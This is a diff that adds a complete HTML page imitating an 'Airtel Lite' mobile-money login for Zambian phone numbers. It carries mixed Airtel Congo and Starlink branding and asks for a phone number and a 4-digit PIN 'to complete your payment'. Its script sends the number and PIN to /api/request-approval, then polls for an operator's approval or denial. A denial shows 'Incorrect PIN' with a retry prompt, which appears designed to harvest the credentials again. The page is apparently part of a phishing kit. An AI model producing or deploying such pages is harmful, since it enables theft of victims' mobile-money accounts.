@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+<title>Airtel Lite — Login</title>
+<style>
+  :root{
+    --airtel-red:#e30613;
+    --text-dark:#3a3a3a;
+    --text-grey:#7a7a7a;
+    --border-blue:#1857c4;
+    --footer-bg:#f4f4f4;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+  html{-webkit-text-size-adjust:100%;}
+  body{
+    font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background:#fff;
+    color:var(--text-dark);
+    min-height:100svh;
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+  }
+
+  main{
+    flex:1;
+    padding:clamp(24px, 8vw, 40px) 20px 24px;
+    width:100%;
+    max-width:480px;
+    margin:0 auto;
+  }
+
+  .logo-wrap{
+    text-align:center;
+    margin-bottom:36px;
+  }
+  .logo-row{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+  }
+  .logo-img{
+    height:38px;
+    width:auto;
+    max-width:100%;
+    display:block;
+  }
+
+  h1{
+    font-size:clamp(20px, 6vw, 25px);
+    font-weight:700;
+    color:var(--text-dark);
+    line-height:1.35;
+    margin-bottom:28px;
+  }
+
+  .phone-field{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    border:2px solid var(--border-blue);
+    border-radius:12px;
+    padding:12px 14px;
+    margin-bottom:28px;
+    min-height:52px;
+  }
+  .phone-field .flag{
+    width:24px;height:18px;
+    flex-shrink:0;
+    border-radius:2px;
+    overflow:hidden;
+    display:flex;
+  }
+  .phone-field .flag svg{width:100%;height:100%;display:block;}
+  .phone-field .code{
+    font-size:16px;
+    font-weight:600;
+    color:var(--text-dark);
+    flex-shrink:0;
+  }
+  .phone-field input{
+    flex:1;
+    border:none;
+    outline:none;
+    font-size:16px;
+    color:var(--text-dark);
+    min-width:0;
+    width:100%;
+  }
+  .phone-field input::placeholder{color:#9b9b9b;}
+
+  .code-label{
+    text-align:center;
+    font-size:14px;
+    color:var(--text-grey);
+    font-weight:600;
+    margin-bottom:14px;
+  }
+
+  .code-row{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    margin-bottom:32px;
+    flex-wrap:nowrap;
+  }
+  .code-boxes{
+    display:flex;
+    gap:10px;
+    flex:1;
+    justify-content:center;
+  }
+  .code-boxes input{
+    width:100%;
+    max-width:56px;
+    aspect-ratio:1;
+    min-width:40px;
+    min-height:44px;
+    text-align:center;
+    font-size:20px;
+    font-weight:700;
+    border:2px solid var(--border-blue);
+    border-radius:10px;
+    outline:none;
+    color:var(--text-dark);
+  }
+  .code-boxes input:focus{border-color:var(--airtel-red);}
+
+  .connexion-btn{
+    width:100%;
+    min-height:52px;
+    border-radius:26px;
+    border:none;
+    background:#d9d9d9;
+    color:#fff;
+    font-size:14px;
+    font-weight:700;
+    letter-spacing:0.5px;
+    cursor:not-allowed;
+    touch-action:manipulation;
+    transition:background .2s ease;
+  }
+  .connexion-btn.active{
+    background:var(--airtel-red);
+    cursor:pointer;
+    box-shadow:0 8px 18px rgba(227,6,19,0.3);
+  }
+  .connexion-btn.active:active{transform:translateY(1px) scale(0.99);}
+
+  /* --- Invalid phone number modal --- */
+  .invalid-modal{
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    background:rgba(0,0,0,0.32);
+    backdrop-filter:blur(2px);
+    -webkit-backdrop-filter:blur(2px);
+    z-index:100;
+  }
+
+  .invalid-modal.visible{display:flex;}
+
+  .invalid-card{
+    width:min(540px, 100%);
+    background:#fff;
+    border-radius:22px;
+    padding:34px 28px 26px;
+    text-align:center;
+    box-shadow:0 18px 44px rgba(0,0,0,0.18);
+  }
+
+  .warning-icon{
+    display:none;
+  }
+
+  .invalid-card h2{
+    color:var(--airtel-red);
+    font-size:clamp(26px,7vw,40px);
+    font-weight:800;
+    margin-bottom:14px;
+    line-height:1.2;
+  }
+
+  .invalid-card p{
+    color:#2a2a2a;
+    font-size:clamp(16px,4.5vw,22px);
+    font-weight:500;
+    line-height:1.45;
+    margin:0 auto 22px;
+    max-width:540px;
+  }
+
+  .invalid-card button{
+    width:100%;
+    min-height:58px;
+    border:none;
+    border-radius:12px;
+    background:var(--airtel-red);
+    color:#fff;
+    font-size:clamp(18px,4vw,26px);
+    font-weight:800;
+    cursor:pointer;
+    box-shadow:0 10px 20px rgba(227,6,19,0.22);
+  }
+
+  @media(max-width:480px){
+    .invalid-card{padding:48px 28px 52px;border-radius:28px;}
+    .warning-icon{transform:scale(.88);margin-bottom:18px;}
+  }
+
+  /* --- Waiting-for-approval overlay --- */
+  .approval-overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.32);
+    backdrop-filter:blur(2px);
+    -webkit-backdrop-filter:blur(2px);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    text-align:center;
+    z-index:50;
+  }
+  .approval-overlay.visible{display:flex;}
+  .approval-card{
+    width:min(540px, 100%);
+    background:#fff;
+    border-radius:22px;
+    padding:30px 28px 24px;
+    box-shadow:0 18px 44px rgba(0,0,0,0.18);
+    text-align:center;
+  }
+  .spinner{
+    width:52px;
+    height:52px;
+    border:4px solid #eee;
+    border-top-color:var(--airtel-red);
+    border-radius:50%;
+    animation:spin 0.9s linear infinite;
+    margin:0 auto 18px;
+  }
+  @keyframes spin{
+    to{transform:rotate(360deg);}
+  }
+  .approval-overlay h2{
+    font-size:clamp(23px,4vw,36px);
+    font-weight:800;
+    color:var(--airtel-red);
+    margin-bottom:10px;
+  }
+  .approval-overlay p{
+    font-size:clamp(16px,2.6vw,22px);
+    color:#2a2a2a;
+    max-width:300px;
+    line-height:1.45;
+    margin:0 auto;
+  }
+  .approval-overlay .denied-msg{
+    display:none;
+    color:var(--airtel-red);
+    font-weight:700;
+    font-size:clamp(18px,3vw,26px);
+    margin-top:8px;
+  }
+  .approval-overlay .retry-btn{
+    display:none;
+    margin-top:18px;
+    border:none;
+    background:var(--airtel-red);
+    color:#fff;
+    font-weight:800;
+    font-size:clamp(18px,3vw,26px);
+    letter-spacing:0.4px;
+    width:100%;
+    min-height:58px;
+    border-radius:12px;
+    cursor:pointer;
+    box-shadow:0 10px 20px rgba(227,6,19,0.22);
+  }
+
+  footer{
+    background:var(--footer-bg);
+    padding:36px 24px 24px;
+    text-align:center;
+  }
+  footer .logo-row{margin-bottom:22px;}
+  footer .footer-logo-img{height:30px;}
+  footer .logo-tag{margin-bottom:22px;}
+  footer .collab-text{
+    font-size:14px;
+    color:var(--text-dark);
+    font-weight:600;
+  }
+  footer .collab-brand{
+    font-size:14px;
+    color:var(--text-dark);
+    font-weight:700;
+    margin-top:2px;
+  }
+  footer hr{
+    border:none;
+    border-top:1px solid #e0e0e0;
+    margin:22px 0 18px;
+  }
+  footer .copyright{
+    font-size:12px;
+    color:#9b9b9b;
+  }
+</style>
+</head>
+<body>
+
+  <main>
+    <div class="logo-wrap">
+      <div class="logo-row">
+        <img src="assets/img/logo.svg" alt="Airtel" class="logo-img">
+      </div>
+    </div>
+
+    <h1>Log in to Airtel Lite to complete your payment.</h1>
+
+    <div class="phone-field">
+      <span class="flag">
+        <svg viewBox="0 0 30 20" width="30" height="20" aria-label="Zambia">
+          <rect width="30" height="20" fill="#198A00"/>
+          <rect x="21" y="10" width="3" height="10" fill="#DE2010"/>
+          <rect x="24" y="10" width="3" height="10" fill="#000"/>
+          <rect x="27" y="10" width="3" height="10" fill="#EF7D00"/>
+          <path d="M19.5 6L25.5 3.5L31 6L25.5 7.2Z" fill="#EF7D00"/>
+          <path d="M24.5 4.5L25.5 9L26.5 4.5Z" fill="#EF7D00"/>
+        </svg>
+      </span>
+      <span class="code">+260</span>
+      <input type="tel" id="phoneInput" placeholder="0951234567" inputmode="numeric" maxlength="10">
+    </div>
+
+    <div class="code-label">Enter your PIN code</div>
+    <div class="code-row">
+      <div class="code-boxes">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+      </div>
+    </div>
+
+    <button class="connexion-btn" id="connexionBtn" disabled>LOGIN</button>
+  </main>
+
+  <div class="invalid-modal" id="invalidModal" role="dialog" aria-modal="true" aria-labelledby="invalidTitle">
+    <div class="invalid-card">
+      <div class="warning-icon" aria-hidden="true">
+        <div class="triangle"></div>
+        <div class="mark"></div>
+        <div class="dot"></div>
+      </div>
+      <h2 id="invalidTitle">Invalid format</h2>
+      <p id="invalidMessage">The phone number must start with 9 (9 digits) or 09 (10 digits)!<br>Please enter the correct number and try again!</p>
+      <button type="button" id="invalidOkBtn">OK</button>
+    </div>
+  </div>
+
+  <div class="approval-overlay" id="approvalOverlay">
+    <div class="approval-card">
+      <div class="spinner" id="spinner"></div>
+      <h2 id="overlayTitle">Awaiting approval</h2>
+      <p id="overlayText">Your request has been sent. Please wait while it is being verified…</p>
+      <p class="denied-msg" id="deniedMsg">Incorrect PIN.</p>
+      <button class="retry-btn" id="retryBtn">RETRY</button>
+    </div>
+  </div>
+
+  <footer>
+    <div class="logo-row">
+      <img src="assets/img/logo.svg" alt="Airtel" class="logo-img footer-logo-img">
+    </div>
+    <div class="collab-text">In collaboration with</div>
+    <div class="collab-brand">STARLINK™</div>
+    <hr>
+    <div class="copyright">© 2026 Airtel Congo. All rights reserved.</div>
+  </footer>
+
+<script>
+  [
+    'smsCooldownUntil',
+    'smsExpired',
+    'smsRetryInProgress'
+  ].forEach(key => sessionStorage.removeItem(key));
+
+  const phoneInput = document.getElementById('phoneInput');
+  const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
+
+  // Automatically reflect the phone number passed from the loan application.
+  const incomingParams = new URLSearchParams(window.location.search);
+  const incomingPhone = incomingParams.get('phone') || '';
+  const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^260/, '');
+  if (/^(?:9[0-9]{8}|09[0-9]{8})$/.test(normalizedPhone)) {
+    phoneInput.value = normalizedPhone;
+  }
+  const connexionBtn = document.getElementById('connexionBtn');
+
+  const invalidModal = document.getElementById('invalidModal');
+  const invalidMessage = document.getElementById('invalidMessage');
+  const invalidOkBtn = document.getElementById('invalidOkBtn');
+
+  function showInvalidPhone(message){
+    invalidMessage.innerHTML = message;
+    invalidModal.classList.add('visible');
+  }
+
+  function checkFormValid(){
+    const phone = phoneInput.value.trim();
+    const codeFilled = codeBoxes.every(b => b.value.length === 1);
+
+    // Let the user submit any entered number. Validation happens after
+    // clicking CONNEXION, so invalid numbers can show the modal.
+    if(phone.length > 0 && codeFilled){
+      connexionBtn.classList.add('active');
+      connexionBtn.disabled = false;
+    } else {
+      connexionBtn.classList.remove('active');
+      connexionBtn.disabled = true;
+    }
+  }
+
+  phoneInput.addEventListener('input', () => {
+    // Keep the field clean, but do not show an error while typing.
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+    checkFormValid();
+  });
+
+  invalidOkBtn.addEventListener('click', () => {
+    invalidModal.classList.remove('visible');
+    phoneInput.focus();
+  });
+
+  codeBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/[^0-9]/g, '');
+      if(box.value && i < codeBoxes.length - 1){
+        codeBoxes[i + 1].focus();
+      }
+      checkFormValid();
+    });
+    box.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !box.value && i > 0){
+        codeBoxes[i - 1].focus();
+      }
+    });
+  });
+
+  const overlay = document.getElementById('approvalOverlay');
+  const spinner = document.getElementById('spinner');
+  const overlayTitle = document.getElementById('overlayTitle');
+  const overlayText = document.getElementById('overlayText');
+  const deniedMsg = document.getElementById('deniedMsg');
+  const retryBtn = document.getElementById('retryBtn');
+  let pollTimer = null;
+
+  function showOverlayWaiting(){
+    overlay.classList.add('visible');
+    spinner.style.display = 'block';
+    overlayTitle.textContent = 'Please wait...';
+    overlayTitle.style.display = 'block';
+    overlayText.style.display = 'block';
+    overlayText.textContent = 'This usually takes a few seconds';
+    deniedMsg.style.display = 'none';
+    retryBtn.style.display = 'none';
+  }
+
+  function pollApproval(id, params){
+    if(pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(async () => {
+      try {
+        const res = await fetch('/api/check-approval/' + id);
+        const data = await res.json();
+
+        if(data.status === 'approved'){
+          clearInterval(pollTimer);
+          params.set('id', id);
+          window.location.href = 'message.html?' + params.toString();
+        } else if(data.status === 'denied'){
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        }
+        // 'pending' -> keep polling
+      } catch (err) {
+        // network hiccup — keep trying silently
+      }
+    }, 2500);
+  }
+
+  retryBtn.addEventListener('click', () => {
+    overlay.classList.remove('visible');
+  });
+
+  connexionBtn.addEventListener('click', async () => {
+    const phone = phoneInput.value.trim();
+
+    // Show the invalid-number page only when the user tries to submit.
+    if(!/^(?:9[0-9]{8}|09[0-9]{8})$/.test(phone)){
+      showInvalidPhone(
+        'The phone number must start with 9 (9 digits) or 09 (10 digits).<br>Please enter the correct number and try again!'
+      );
+      return;
+    }
+
+    if(connexionBtn.disabled) return;
+
+    const params = new URLSearchParams(window.location.search);
+    const code = codeBoxes.map(b => b.value).join('');
+    params.set('phone', phone);
+
+    showOverlayWaiting();
+
+    try {
+      const res = await fetch('/api/request-approval', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          plan: params.get('plan'),
+          price: params.get('price'),
+          phone: phone,
+          code: code,
+          step: 'login'
+        })
+      });
+      const data = await res.json();
+      pollApproval(data.id, params);
+    } catch (err) {
+      overlayTitle.textContent = 'Connection error';
+      overlayText.textContent = "Unable to send the request. Check your connection and try again.";
+      spinner.style.display = 'none';
+      retryBtn.style.display = 'inline-block';
+    }
+  });
+</script>
+
+</body>
+</html>
